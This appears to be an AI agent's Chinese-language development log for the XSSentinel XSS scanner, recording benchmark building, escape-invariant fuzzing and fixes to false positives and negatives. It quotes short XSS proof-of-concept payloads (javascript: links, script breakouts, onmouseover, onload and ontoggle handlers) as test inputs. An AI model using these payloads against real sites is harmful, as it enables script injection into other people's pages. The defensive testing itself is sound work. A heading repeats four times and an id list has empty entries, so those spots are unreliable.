- `pos/neg-mx-01`（`L7_mutation`）：层要求"载荷**原样存活**进响应"+"页面在 `<script>` 或 `on*=` 区域里有变异 sink"（`has_mutating_sink` 只搜这两处）。靶场是"markdown 预览"形态：原样渲染 + 用 `DOMParser().parseFromString(...)` 解析再序列化。**sink 刻意选 DOMParser 而不是 innerHTML**：innerHTML 家族在 Trusted Types 层的清单上（Phase 123 的教训），会让正确用例的安全孪生报 medium 把门禁打红；DOMParser 同样是真实变异载体且不在那张清单上。安全孪生只改一处：转义后载荷不再原样存活。

**缺陷（本轮最值钱的东西）**：写 mx 用例时，安全孪生（已转义、文本节点里躺着 token）竟然产出 **`reflected` = high**。顺着证据链查到 `verifier._mxss_confirm`：它把 **token**（而不是载荷）传给了 `mutation.analyze()`，而该函数的 `reflected` 是**全响应子串测试**——于是判定退化成"**token 出现在某处 + 页面某处有变异 sink**"，哪怕 token 已被转义成文本、浏览器永远不会执行。任何"转义输出 + 页面带 innerHTML/DOMParser 脚本"的正常应用都会被打上 high：这是 Phase 123 那个家族的**又一次现身**（用对转义免疫的信号做强判定）。
修法两步：① 要求 token 真的落在**可执行上下文**（活 `<script>`、`on*=` 值、`javascript:` URI）；② 第一版我复用了 `mxss_verify.marker_in_exec_context()`，结果发现**这个助手自己也是转义盲的**——它的 handler/URI 正则在全文档上搜，`&lt;img src=x onerror=alert(&#x27;TOKEN&#x27;)&gt;` 照样命中。于是按 Phase 123 的做法改成"**只在真实标签体内、且按完整属性分词**"（`alt="x onerror=alert(TOKEN)"` 这种"handler 文本躺在别的属性值里"也不再算）。8 种形态全对；`tests/test_mxss_exec_context.py` 10 例锁定（含"转义反射 + sink 不得确认""原样反射 + sink 必须确认"两面）。

**顺带发现并规避的一颗雷**：`xssentinel/core/mxss_verify.py` 被 `.git/info/exclude` 排除、**从未进过仓库**，而全仓库**没有任何已跟踪代码**引用它。如果我的修复就这么 `import` 它，别人 clone 后这里会 ImportError、再被 `_mxss_confirm` 的 `except` 吞掉——**整条 mXSS 确认分支静默失效**，比原来的误报更糟。因此该检查最终写成 verifier 自带的 `_marker_in_exec_context()`，不引入对未跟踪模块的依赖（那个模块本身仍是未跟踪状态，是否入库由你决定）。

**教训**：**不要因为助手函数名字合理就信任它的语义**——这次我把 Phase 123 的修复思路套用到一个语义更弱的助手（`marker_in_exec_context`）上，同款 bug 换了个地方复现；而且差点把 shipped 代码绑上一个不在仓库里的模块。凡是"判断某段文本是否构成真实标记/真可执行"的地方，都要用同一条纪律：真实标签体 + 属性分词 + 对转义免疫的信号一律不作数。

**Phase 138：再加 3 种过滤（共 9 种），并修掉我自己这张网的方法缺陷——单次零结果不算证据**。

新增过滤：`strip_handlers`（黑名单删 `on*=`）、`entity_decode`（输出前先解一次实体，双解码那类 bug）、`escape_lt_only`（半吊子转义，只转义 `<`）。矩阵脚本也支持了"只跑指定过滤"，新维度可以单独探（否则 81 组太慢）。

**这轮真正的产出是一次自我修正**：首跑报了个 FN（`attr_sq` + 只转义 `<`），但我注意到一个矛盾——那条载荷里根本没有 `<`，所以该模式与"原样"渲染出的页面**应当完全一样**，而"原样"是确认的。连跑 6 次验证：两种模式**6/6 全报**，那个"FN"是抖动（抖动成本也看得出：该组合要 59 个请求，原样只要 45，请求越多越容易被本机那口子掐掉一次）。

于是给矩阵加了**复跑确认**：零结果先重扫 2 次，仍为零且**验证器基准真相**也确认才算 FN。加完之后重跑同一批：**PASS**，那个假 FN 消失，剩下的零结果被正确归为"过滤器确实中和了"。

**教训（与上一轮"假绿"同源）**：在这台机器上，**任何单次运行的"零"或"绿"都不是证据**——零可能是漏扫，绿可能是没扫到。判据要么复跑，要么配一个"该报的必须报"的锚。

**Phase 137：过滤维度从 3 种扩到 6 种，再抓 2 个 FN——根因是元素上下文从不试 `javascript:` URI 载荷**。

把 `/fuzz/render` 的过滤维度补到 6 种：原样 / 去 `<script>` / 只转义尖括号 / **只转义引号**（`encode_angles` 的镜像）/ **去全部标签** / **递归去 `<script>`**（`strip_script` 的加固版）。矩阵变成 **9 上下文 × 6 过滤 = 54 组**，抓到 2 个 FN，而且两个都是"载荷的力量来自引号或协议名，而不是标签"这种过滤器管不着的形状：

- `text` + 去 `<script>`：`<a href="javascript:alert(1)">x</a>` 不含 script 标签，过滤器原样放过 → 验证器确认、扫描无报。
- `script_dq` + 去全部标签：载荷 `"></script><script>alert(1)</script>` 被剥成 `">alert(1)`，`"` 照样闭合，JS 变成 `var a = "" > alert(1)` → **`alert(1)` 真的执行** → 验证器确认、扫描无报。

根因（`payloads.py` 的 `_CROSS_CONTEXT`）：`url_javascript` 只作为 `url_href` / `meta_refresh` 的跨上下文候选，**`html_element` 从来不试它**——于是元素上下文里引擎根本不会送 `javascript:` URI 载荷。加上 `("url_javascript", 2)`（n 取小值，遵守 Phase 43 的教训：跨上下文样本会重排预算窗口）后，两个 FN 都变成 `reflected` high。

**代价必须验**：这类改动最容易换来误报。所以同一轮跑了**全部 70 个安全用例的直连复查：误报 0**。

**Phase 130：不变量网扩到"上下文一致性"（找 FN 的那半边），并修掉第七个引擎缺陷——单引号属性被判成无引号属性**。

Phase 129 那张网问的是"该闭嘴时闭嘴了吗"（误报侧）。这轮补的是镜像问题：**"该说话时说话了吗"**——引擎自己语料库里为某个上下文写的载荷，被**原样**反射进那个上下文（或经一个过滤器）时，只要**验证器**判定这个形状是活的，扫描就必须确认。判据不是"必须有 finding"（那会变成自己给自己打分），而是**用扫描器自己那套 `verifier.mark()` + `verify_semantic()` 当基准真相**：验证器确认而扫描没报 ⇒ **真 FN**；验证器也不确认 ⇒ 说明这个模板/过滤器组合确实中和掉了，记为信息性，不算失败。这一步才是把"引擎漏了"和"我的玩具页面没模拟到"分开的关键。

矩阵 = 9 个上下文 × 3 种过滤（原样 / 去 `<script>` / 只转义尖括号），靶场加了 `strip_script` 与 `encode_angles` 两种过滤模式。**结果：27 组里抓到 1 个真 FN** —— `attr_sq`（单引号属性）+ 只转义尖括号：验证器确认 `' onmouseover=alert(1) x='` 能逃逸，扫描却只报了个 medium 的 `polyglot_reflection`。同一过滤器下双引号属性是正常确认的（`reflected` high），**不对称本身就说明有问题**。

根因在 `context._attribute_context()`：为了让被截断的属性值能被匹配，代码在片段后拼了个尾巴 `">`——它只能**闭合双引号**。单引号值闭合不了，正则就退回"无引号"分支，于是 `<input value='...'>` 被判成 `html_attribute_noquote`：引擎改用"靠空格逃逸"的语料，在单引号里当然逃逸不出去。修法是让尾巴能闭合两种引号（`'"'`），四种形态（sq / dq / 无引号 / 多属性）全对。修完 `attr_sq` 报 `reflected` **high**，dq 与无引号不受影响。

**又是同一个模式**：对称的两个变体只处理了一个（async/sync 对偶、dq/sq 引号对、以及这次的属性引号对）。这次是第 7 个基准驱动的引擎缺陷。`tests/test_attribute_context_quote.py` 6 例锁定（4 条判定矩阵 + 端到端"单引号逃逸必须被 high 确认"）。

**修正后：49 层中 48 已覆盖，1 未覆盖**（仅 `L8_cookie_tossing`——需要父子域语义，在本机 127.0.0.1/localhost 上不可构造，继续记账而非硬造）。基准 176 用例，验证 **TP2 TN2 FP0 FN0**。

**Phase 129：生成式"转义一致性"属性模糊测试——把这一轮反复踩的 bug 家族自动化成不变量**。

先做了一个**前提判断**（而不是直接去扩语料）：本轮挖出的 6 个引擎缺陷——转义盲判定 ×2、time-based 从不启动监听器、场景占位符未展开、viewer 注册表错位、静态助手语义过弱——**没有一个是"缺载荷形状"造成的**，全是判定逻辑问题。语料现状是 **1074 条 / 38 个上下文 / 36 polyglot**，规模不是瓶颈；而"再手写 9000 条 + 继续自写用例"还会加重过拟合（基准全绿恰恰只说明"我们想到的场景都覆盖了"）。所以这一轮不扩语料，改做**生成式不变量测试**。

做法：
- 靶场新增参数化渲染端点 `/fuzz/render?q=&ctx=&esc=&sink=`（9 种上下文 × 3 种转义 × 2 种页面 sink）。它**刻意不写进 manifest**：aux 用例照样会被计分，而参数化助手本身不是漏洞靶标，因此走 `EXTRA_ROUTES` 注册，不污染计分口径。
- `benchmark/fuzz_escape_matrix.py` 跑全矩阵，断言**不变量**：*应用若对反射值做了 HTML 转义，则只有在载荷的可执行性不依赖被转义字符时才允许报 high/medium*。对 text / attr_dq / attr_sq / script_dq / script_sq / svg / comment 这 7 个上下文，转义必然切断逃逸 → **任何 high/medium 都是误报**。
- **文档化例外**（转义中和不掉，报了是对的，只记录不判失败）：`attr_bare`（无引号属性靠空格即可逃逸）、`href`（`javascript:` 不需要引号或尖括号）。
- **两道防空转护栏**（否则"全是 0"永远通过）：① `text + raw` **必须**确认，否则整轮作废；② `attr_bare + html` **必须仍然确认**——若哪天把引擎收得过紧、连该报的都掐了，这条会红。

结果：**矩阵全绿**，含 `escaped + page sink` 这一维——它正是 Phase 123（clobber）与 Phase 128（mXSS）两个误报的组合形态；同时例外维度按预期**照样确认**，说明这套网有判别力、不是"恒零"。代表性子集已进回归：`tests/test_escape_invariant_fuzz.py`（8 例，含 anchor 与判别力正向锁）。

顺带清理：Phase 127 我误以为没有 data 目录，在**仓库根**造了一份 `data/scenarios.example.json`——正主其实一直在 `xssentinel/data/`（语料、compliance、fix_advice 都在那儿）。已删除重复文件，并把 Phase 127 的两条事实补进正主的 `_meta.note`（`{param}` 在 `path`/`payload`/**字段名**三处都展开；步骤路径按 origin 解析）。正主那份示例的步骤**省略了 `param` 字段**，这正是那个 bug 一直没被它暴露的原因。

**Phase 123：`L7_dom_clobber` 覆盖，并修掉第三个基准驱动的引擎缺陷（转义过的反射仍被当成真实属性）**。

**Phase 123：`L7_dom_clobber` 覆盖，并修掉第三个基准驱动的引擎缺陷（转义过的反射仍被当成真实属性）**。

**Phase 123：`L7_dom_clobber` 覆盖，并修掉第三个基准驱动的引擎缺陷（转义过的反射仍被当成真实属性）**。

**Phase 123：`L7_dom_clobber` 覆盖，并修掉第三个基准驱动的引擎缺陷（转义过的反射仍被当成真实属性）**。

按"先看代码再写用例"的规矩确认触发链：该层把 `<a id={token} name={token} href="javascript:alert(1)">x</a>` 打进参数，要求① `id=<token>` 是**真实落地的属性**、② 页面 JS 里存在 `getElementById(...)` / `document.<name>` / `querySelector('#...')` 这类引用、③ 存在危险 sink，三者齐才发 `type="dom_clobber"`（类型是查出来的，不是猜的）。

写用例的过程中撞出**该层自身的系统性误报**（本轮真正的收获）：`detect_reflection` 判的是"文本里有没有 `id=<token>`"——**这个问法对 HTML 转义免疫**。正确转义后的页面 `<div id="stage">&lt;a id=xclob_123 ...&gt;</div>` 里，`id=xclob_123` 照样是肉眼可见的文本；而只要页面**碰巧**有 `getElementById` 脚本 + 一个 sink（真实应用几乎普遍满足），该层就报 `dom_clobber` **high**。基准用 `neg-clobber-02`（同一页面、同一脚本，**只把转义打开**）复现：修复前 **FP**，修复后 **TN**。与 Phase 122 的 WAF 指纹头同源：**对仅表示"样子像"、不表示"真成立"的信号做了强判定**。

修法两层（第一层不够）：① 只在**真实、未转义的标签体**里找（`<\s*[a-zA-Z][^>]*>`，在第一个 `>` 处收尾——把落在文本节点里的转义载荷排除）；② 标签体再按「属性名 = 带引号值 / 无引号值」**正经分词**，否则 `<img alt="&lt;a id=TOKEN&gt;">` 仍会命中——那里 token 只是 alt 值里的转义文本，浏览器不会创建任何元素。10 种形态全对（文本节点转义 / 属性内转义 / 剥标签 / 无反射 / 无关属性值 均 False；裸反射 / `id` 带引号 / `name` / 大写标签等 5 种真元素形态**仍要检出**——修 FP 不能把层修瞎）；`tests/test_dom_clobber_reflection.py` 锁定。
**家族特征**（已 grep core，暂无第二处）：**用"载荷碎片"判定反射**，而该碎片恰好在 HTML 转义下不变。往后凡"只搜片段不搜完整载荷"的判定，都要先问一句：转义之后它还成立吗？

附带一个反直觉的设计约束：**这层的 safe 双胞胎不能靠转义**——`neg-clobber-01` 改用剥标签消毒器，而"转义救不了"这件事本身被做成了 `neg-clobber-02` 这个 FP 回归用例。

基准增至 **164 用例**（`pos-clobber-01` TP、`neg-clobber-01` TN、`neg-clobber-02` 因为对的理由 TN），验证 **TP1 TN2 FP0 FN0**。
**修正后：49 层中 42 已覆盖，7 未覆盖**（L4_second_order、L5_blind_oob、L7_mutation、L7_time_based、L8_cookie_tossing、L7_xsleak、L9_scenario）。

**Phase 119：145 用例双引擎基线（双引擎 F1 均为 1.000），并修掉一个"我自己的 FP"**。

**基线（145 用例）**：sync **TP91 FP0 TN54 FN0**（recall/precision/F1 全 1.000）；async **TP90 FP0 TN53 FN0 + 2 SKIP**（stored 是 sync-only，按声明跳过）。sync 侧 fn-retry 又救回 1 个（`pos-url-04`）；async 侧救回 2 个（`neg-rcdata-02`、`pos-tt-01`）。**Phase 109-118 新加的 38 个家族用例在两个引擎下全部正确**。

**那次 async FP 是我造的，不是引擎**：`neg-waf-01`（"严 WAF"安全目标）在 async 下报 high —— async 发了 `<details open ontoggle=alert(...)>`，而我的"严 WAF"只列举了几个事件处理器（`onload=`/`onerror=`/…），**`ontoggle=` 不在列表里** → 回显 → **引擎判定完全正确**，是我的 safe 目标不严。修法不是改引擎，而是把"严 WAF"从**列举式**改成**拦类**：任何标签开头、任何 `on\w+\s*=`、`javascript:`、`data:text/html`、以及 `&#60;`/`%3c`/`\u003c` 等编码形态。

**顺带揪出一个隐蔽的工程 bug**：该块被插入过两次，而 Python 取**最后**一个定义 → 旧版 `_waf_blocked`（纯子串匹配）**静默覆盖**了支持正则的新版，导致"严 WAF 什么都不拦"。已去重，并加测试断言这几个 handler 只定义一次（同类重复插入在 Phase 117 也发生过——**写插入脚本要幂等：先查标记是否存在**）。

**Phase 118：把 WAF 目标搬进基准（`L2_waf_evade`），并给覆盖矩阵补上对账测试**。伪 WAF 原本只存在于 `tests/test_waf_bypass_e2e.py`（Phase 102）里：响应头 `Server: cloudflare` + `CF-RAY`，403 掉 WAF 签名最熟的朴素形态（`<script`、`<svg onload=`），放行升级后的绕过变体。本轮把它做成两个基准目标——**弱 WAF**（可绕过，vulnerable）与**严 WAF**（所有可执行形态全拦，safe），验证 **TP1 TN1**。

**第六次踩"类型名靠猜"**：WAF 绕过命中的 finding 是 **`polyglot_reflection`**，不是我以为的 `reflected`（清单里写错 → 判成 FN）。**意外收获**：这说明 `L7_polyglot` 层其实已被 WAF 用例间接覆盖，而矩阵一直标它未覆盖。

**给覆盖矩阵加对账测试**（`tests/test_coverage_matrix_parity.py`）：Phase 116/117/118 加了 14 个用例却**没同步矩阵的 layer→modes 映射**，矩阵一直把它们标成"未覆盖"——与 Phase 115 同源的清单漂移。现在三条断言封死：矩阵只能引用真实存在的 mode（顺带查出 Phase 111 时我猜错的三个 mode 名：`base_href`/`cdata`/`meta_refresh` 实为 `raw_*`）、**每个 vulnerable 用例的 mode 必须被某个层认领**、矩阵必须覆盖全部已登记层。

**修正后的真实图景：49 层中 35 层已覆盖，14 层未覆盖**（此前报告 26/23 是因为上述漂移）。

**Phase 117：再补两层（`L7_sanitizer_bypass` / `L8_graphql`），一次通过**。这轮改了做法——**先读模块的真实触发条件与 finding 类型，再写用例**（Phase 116 因猜类型名返工了四次）：sanitizer 层实际报 `sanitizer_vulnerable_version` / `sanitizer_output_to_innerhtml`（且**任何**"净化 → innerHTML"都会报，所以 safe 双胞胎必须同时换版本**和**换成 textContent sink）；graphql 层要求 `has_graphql` + sink 消费 GraphQL 数据（`has_data_ref`），safe 双胞胎保留同样的查询、只换 textContent sink。结果 **TP2 TN2 FP0 FN0**（基准 139 → 143）。

**另外两类记账为"需基础设施"，不硬造**：`L8_cookie_tossing` 需要**父域 Set-Cookie**（`Domain=` 指向响应主机的父域），而基准跑在 `127.0.0.1`/`localhost` 上，IP 与 localhost 没有父子域语义 → 本地环境无法触发；`L7_xsleak` 只在 async 引擎实现。

**Phase 116 / 116b：再补五层，并抓出第五个同家族误报**。照 Phase 113/114 的配方，为纯源码分析的 5 个层各造一对目标（vulnerable + safe 对照，基准 141 → 139 用例）：`L7_dangling_markup`、`L7_import_map`、`L7_sri_bypass`、`L8_trusted_types`、`L8_websocket`，最终 **TP5 TN5 FP0 FN0**。过程中反复踩到同一个坑（**第四、五次**）：manifest 里写的 `finding_types` 是我"以为"的类型，不是层实际发出的类型——`dangling_markup_potential`、`import_map_cross_origin`、`sri_missing_script`、`trusted_types_policy_bypass` 全部与最初写的名字不同。

**116b（Trusted Types 层的误报，家族第五例）**：`_IDENTITY_ARROW_RE` 用 `\b` 判定 `(s) => s` 结束，而 `(s) => s.replace(/</g,'&lt;')` 里标识符后跟 `.` **同样是单词边界** → **会净化的策略也被报成 identity bypass**（"透传"与"净化"两个双胞胎都报 `tt_policy_bypass`）。修：要求标识符后只能是分隔符（`, ; ) } ]` 或结尾），即"原样返回"才算 bypass。验证：3 种透传形态（箭头/短箭头/函数 return）仍报，2 种净化形态（`s.replace(...)`、`DOMPurify.sanitize(s)`）不再报。`tests/test_trusted_types_identity.py` 3 例锁定。

**主动移除两个不合格用例**：CSS 注入对（`L7_css_injection`）被我从 manifest 删掉——该层要 CSS 里出现 `javascript:`/`expression()` 形态且只收到"参数名"作为 marker，**当前注入流程无法产生能触发它的请求**，留下就是永久 FN。同理样本设计也会被这类问题卡住。**基准里不留永远过不了的用例**，缺口记在账上而不是假装覆盖。

**Phase 115：覆盖追踪器自身漏登了 11 个层——真实盲区是 39 层中的 19 层**。Phase 111 的"28 层"清单来自 `coverage.py` 的 `LAYERS` 表，而这轮发现**该表本身不完整**：`advanced_layers.py`/`content_layers.py` 实际调度的 22 个层名里，`L8_graphql`、`L8_websocket`、`L7_trusted_types`、`L7_import_map`、`L7_sanitizer_bypass`、`L7_sri_bypass`、`L7_css_injection`、`L7_dangling_markup`、`L7_svg_xss`、`L7_csp_nonce`、`L8_cookie_tossing` 共 **11 个 layer_id 从未登记**（`record_layer()` 的"未知层照记"兜底让它们在数据里存在，但对统计、汇总和 Phase 111 的矩阵完全不可见）。已全部登记（28 → 39），并修正矩阵脚本里 Phase 113 加用例时漏更新的 4 条映射，重新生成 `layer_coverage.md`。

**修正后的真实图景（对账测试后最终版）：49 个 layer_id 中 26 个已覆盖，23 个未覆盖**（对账测试首跑又抓出 10 个未登记 id——、、、、 等散落在 scanner.py / async_scanner.py / advanced_layers.py 里，第一遍只 grep 了两个 layers 文件）。新增未覆盖的 10 层里 8 个是纯源码分析可补的（`L7_css_injection`、`L7_dangling_markup`、`L7_import_map`、`L7_sanitizer_bypass`、`L7_sri_bypass`、`L8_cookie_tossing`、`L8_graphql`、`L8_trusted_types`、`L8_websocket`）。盲区比 Phase 111 报告的更大，根因是**"覆盖追踪器"与"实际调度"没有对账机制**——新增层只要忘了登记，就从所有统计里消失。这本身值得一个后续改进（layer_guard 注册时强制登记，或测试断言 LAYERS 覆盖所有 run_layer 名字）。

**Phase 114：同一 bug 家族再抓两例（service worker / web worker 层）**。Phase 113b 修完 redirect 后立刻 grep 同类写法——`USER_INPUT_RE` + 上下文窗口判定——在 `sw_xss.py` 与 `worker_xss.py` 里找到**一模一样的缺陷**，且窗口更宽（±300 字符）、无字面量检查：一个**无关**脚本里的 `new URLSearchParams(location.search)` 就能把字面量 `register("/sw.js")` / `new Worker("/w.js")` 判成"攻击者可控"（修复前已实测复现）。修法与 113b 一致：**引号字面量不可能携带攻击者输入**，直接判不可控；窗口搜索保留（变量形式的 URL 真的需要看周边的赋值来源）。验证五类形态全对（字面量+无关输入/干净字面量/参数驱动 × sw/wk）；`tests/test_sw_worker_fp.py` 4 例锁定；6 个相关基准用例 TP3 TN3 无回归。

**教训已两次验证**：发现一个 bug 后，立刻 grep 同一写法在别处的实例——三次修复（redirect / sw / worker）来自同一个根因模式（"上下文窗口 + 关键词判定可控性，且不检查赋值/参数本身是什么"）。

**Phase 113 / 113b：补 4 个页面分析层——又抓出一个系统性误报**。Phase 111 的覆盖矩阵列出 14 个未覆盖层，本轮先补**纯源码分析**的 4 个（不需要浏览器）：`L8_open_redirect`、`L8_prototype`、`L8_service_worker`、`L8_web_worker`（它们的层函数签名是 `(scanner, url, html)`，只看页面源码）。8 个用例（各类 vulnerable + safe 对照，基准 121 → 129）验证 **TP4 TN4 FP0 FN0**——prototype / service worker / worker 三层**首次验证即工作**。

**113b：redirect 层的系统性误报（本轮最有价值的发现）**。`find_redirect_sinks` 用「sink 前后 260 字符窗口里有没有用户输入痕迹」判定 `user_controlled`，而 `USER_INPUT_RE` 的备选里含 **`location.href`** —— 而 sink 语句**自身**恰好就是 `location.href = ...`，于是**任何**对 `location.href` 的赋值都被判为"由用户输入驱动"：一个静态 `?redirect=` 链接 + `location.href = '/home';`（字面量）就被报成 open-redirect → XSS。

修法分两步（第一步不够，被自己的测试逼出第二步）：① 右值是**字符串字面量**则一定不可控；② **排除 sink 自身的左值**再搜索输入来源——但**保留右值**，因为真来源常在右值里（`location.href = location.hash.slice(1)`）。验证：4 种安全形态（单/双引号字面量、链接+字面量、无来源变量）全部 `exploitable=False`，2 种真漏洞形态（URLSearchParams 参数、hash）仍 `True`；`tests/test_redirect_fp.py` 5 例锁定。

**Phase 112：用例可以声明"哪个引擎支持我"（SKIP 而非记成漏报）**。121 用例基线里 async 的唯一 FN 是 `pos-stored-01`——但它不是检测失败：`--stored-inject` 按设计是 sync-only（Phase 85 会明确打印"ignored in --async mode"）。把"引擎从未声称支持的能力"记成漏报，是另一种不诚实（让 async 看起来漏了它根本没实现的向量）。现在用例可声明 `engines: [...]`，在不支持的引擎上求值返回 `verdict="SKIP"`——它不等于 TP/FP/TN/FN 中任何一个（统计正是按这四个显式求和），因此不进比率、但在逐用例记录里可见。stored 两个用例已标 `engines: ["sync"]`；`test_bench_engine_scope.py` 用"被 SKIP 的用例绝不能真的发起扫描"来锁定契约。

**121 用例双引擎基线（Phase 110 口径）**：sync **TP79 FP0 TN42 FN0**（121/121）、async **TP78 FP0 TN42 FN1**（唯一 FN 即上述 sync-only 的 stored 用例，Phase 112 后应显示为 SKIP）。两引擎的 fn-retry 各触发 2 次且**全部翻案为 TP**（`pos-script-01` 3 次尝试、`neg-filter-02` 2 次、`pos-script-02`、`neg-rcdata-02`）——Phase 103 的退避+放宽机制在整轮跑动里又救回 4 个真漏洞。新增的 14 个盲区用例在整轮中**零错误**。结果文件 `benchmark/results/p110_sync.json` / `p110_async.json`。

**Phase 111：层覆盖矩阵——28 个检测层里有一半从未被基准触发**。Phase 108/109/110 是按"向量家族"补盲区；这轮反过来做完整的静态盘点：从 `coverage.py` 取出**引擎全部 28 个检测层**，逐个核对 121 个用例（120 个 mode）能否让它真正产出 finding。结果写进 `benchmark/layer_coverage.py`（可重跑）与 `benchmark/results/layer_coverage.md`：

**已覆盖 14 层**（raw/attr/escape/rcdata/script/svg 等反射族、DOM 静态+动态、stored、jsonp、CSP、template、postMessage、header/path/cookie/error/markdown —— 后 5 个是 Phase 109/110 刚补的）。

**未覆盖 14 层**：
- **8 层只需补目标+用例**：`L7_mutation`（只有突变才可执行的形态）、`L7_dom_clobber`（DOM 覆盖）、`L7_polyglot`（需要 polyglot 才能触发）、`L7_time_based`（延迟 sink）、`L8_prototype`（原型污染）、`L8_service_worker`、`L8_web_worker`、`L8_open_redirect`；
- **3 层需要特定基础设施**：`L2_waf_evade`（需 WAF 目标——目前只有 `test_waf_bypass_e2e.py` 覆盖，不在基准内）、`L4_second_order`（需 `--second-order-inject/-viewers`）、`L5_blind_oob`（需 OOB 监听）；
- **3 层是爬取类**：`L9_param_miner` / `L9_js_miner` / `L9_form_miner`（需要带表单/JS/参数线索的页面）。

这是下一轮补盲区的明确清单——**"一半的检测层没被验证过"比任何单个已知缺陷都更值得处理**，因为每一层都可能像 path 层那样"写着但实际不工作"。

**Phase 110：补齐最后两类盲区（upload / stored）——基准覆盖盲区清零**。Phase 108 列出的 7 类未覆盖向量中，剩 upload（multipart 文件名回显）与 stored（写入后被另一 URL 渲染）两类，都需要 POST 能力。本轮给基准服务器加了 `do_POST`（表单/JSON/multipart 解析 + 进程内存储 + 视图端点注册），给 runner 加了三种用例形态（`method` / `upload_field` / `view_path` → 自动拼 `--method -d`、`--upload-field`、`--stored-inject/--stored-view/--stored-param`），117 个既有用例的命令行**逐字节不变**。新增 4 个用例（vulnerable/safe 各一对），验证 **TP2 TN2 FP0 FN0**——两层（`upload_xss`/`stored`）都能正常工作。

至此 Phase 108 发现的 7 类盲区全部补齐（cookie / CORS / markdown / path / error-page / upload / stored），基准 **107 → 121 用例**。新增 `tests/test_bench_post_cases.py`（5 例：三种用例形态的旗标构造 + store 往返的 vulnerable/safe 对照）。

**Phase 109：补上 7 类基准盲区中的 5 类——并立刻抓出 3 个真缺陷**。Phase 108 发现引擎有 7 类向量（cookie/CORS/markdown/path/error/upload/stored）**有层在跑但从无用例**。本轮先补 GET 可实现的 5 类（每类 vulnerable + safe 对照，共 10 个用例，基准 107→117），服务器为此扩展了"请求上下文分发"（handler 可读 Cookie/Origin/path）与"前缀路由"（path 层会把 payload 追加成新路径段）。补完立刻验出 3 个真缺陷：

1. **path 注入层在真实目标上基本是坏的（最严重）**：`_scan_path_xss` 硬编码 `<svg/onload=alert('token')>` 并**裸拼**进路径，而该 payload 含 `/` —— 实际发出的请求是 `/r/pth01/*/%3Csvg/onload=alert('x')%3E`，payload 被 `/` **切成两段**，回显单段的目标永远不可能命中。该层的模块文档声称"不产生含 `/` 的载荷"、`path_xss.py` 也早就有 `path_payloads()` 与 `build_test_url()`（后者用 `safe=""` 把 `/` 编码为 `%2F`）——**代码没用它们**。修：改用模块的载荷集与 URL 构造器。对照证明：同一目标 error 层（用完整编码）命中、path 层不命中，修后两者都命中。
2. **基准判定器把真命中判成 FN**：`_is_detected` 按 `param` 名过滤相关性，而 cookie/path/error 类 finding 的 param 是载体标记（`(cookie:lang)`、`(path)`、`(error_path)`）——与用例的 `q` 不匹配，于是"引擎明明找到了"被记成漏报。修：用例可声明 `finding_types`（精确到类型），未声明的 107 个老用例行为完全不变。
3. **path_xss 模块文档不实**：声称载荷"无嵌入 `/`"，实际列表里 `</script>`、`';alert(1);//` 都含 `/`。真正的不变量在构造器（编码后无裸 `/`），文档已改正、测试锁定。

另修两处测试目标自身的 bug（404 兜底曾让**每个**用例都附带 path/error finding 的噪声；markdown 安全版对非 markdown 文本未转义，`<b>` 直接反射——引擎检出它是对的）。验证：10 个新用例 **TP5 TN5 FP0 FN0**；新增 `tests/test_path_layer_payloads.py`、`tests/test_bench_relevance.py`。

**Phase 108：层开销剖析（速度差距拆到层）+ 暴露的基准盲区**。Phase 107 把速度差距量化了（30.5s vs 13.7s），本轮回答"请求花在哪、哪层产出 finding"。实现方式是**零侵入**：在已有的两个咽喉点埋点——`CoverageTracker.touch_layer()`（58 处层边界标记，现在同时记录本线程当前层）+ `Requester._send()`（所有请求的唯一出口，按当前层累加）——无需改任何调用点。工具 `benchmark/layer_profile.py` 输出"层 × 请求数 × 占比 × 产出 finding 数 × 每 finding 请求成本"。

12 用例 514 请求的剖析结果：`L1_reflection_profile` **121 请求（23.5%）0 命中**、`L7_jsonp` 96（18.7%）、`L8_header` 72（14.0%）、`L8_cookie` 60（11.7%）——**前四层占 68% 请求**；而真正命中的 `L1_reflected` 只花 24 请求（4.7%）产出 7 个 finding（**3.4 请求/finding**）。

⚠️ 剖析顺带暴露了一个更根本的问题：**这些"0 命中"不全是层的错，而是基准没有对应用例**。核对 manifest 的 106 个 mode 后确认，引擎有层在跑、但基准**零用例**的向量类型有 7 类：**cookie 注入、CORS、markdown、path 注入、error page、upload、stored**（`header`/`jsonp`/`template` 有用例，`cookie`/`cors`/`markdown`/`path`/`error`/`upload`/`stored` 全是空的）。也就是说这些检测层的代码从未被基准验证过——这是比速度更该优先补的缺口。

**Phase 107：跨工具对照框架（打破自证循环）**。107 用例满分有个隐患——用例是我们设计的、修复是对着用例做的，等于"自己和自己一致"。新增 `benchmark/run_cross_tool.py` + `NucleiAdapter`：用 **ProjectDiscovery 官方的 DAST XSS 模板**（reflected-xss / dom-xss，第三方维护的 payload 与判定逻辑）在**同一批目标**上与 XSSentinel 对跑，产出逐用例矩阵与差异归因。

首次对照（18 用例，覆盖 12 个可绕过家族 + 6 个安全家族）：

| tool | TP | FP | TN | FN | time |
|---|---|---|---|---|---|
| XSSentinel | 12 | 0 | 6 | 0 | 30.5s |
| nuclei-dast-xss | 11 | 1 | 5 | 1 | 13.7s |

**结论要两面看**：① 准确率上我们 18/18 全对，nuclei 漏了 `pos-dom-01`（它的 dom 模板未触发）并误报 `neg-csp-01`（反射模板不检查 CSP 是否阻断执行）；② **速度上我们更慢**（30.5s vs 13.7s，另一轮跑动里差距达 12 倍）——因为我们对每个参数做多层/语义确认，而 DAST 模板只查反射。这是有外部参照的真实差距，值得后续优化。

过程中修掉两个让对照失真的问题：**XSSentinelAdapter 从 stdout 读 JSON，但 `-f json` 是写 `-o` 文件的**——旧代码因此把每个用例都判成"未检出"（对照被做局成我们全 FN）；**nuclei 的模板更新检查在代理环境下卡满 240s 超时**，加 `-duc -nc` 后降到 0.7s。另记录一个命名陷阱：`neg-` 前缀表示"**有防御**"而非"安全"（`neg-rcdata-01..04`、`neg-filter-01..03/05/06` 的 ground truth 是 vulnerable）。

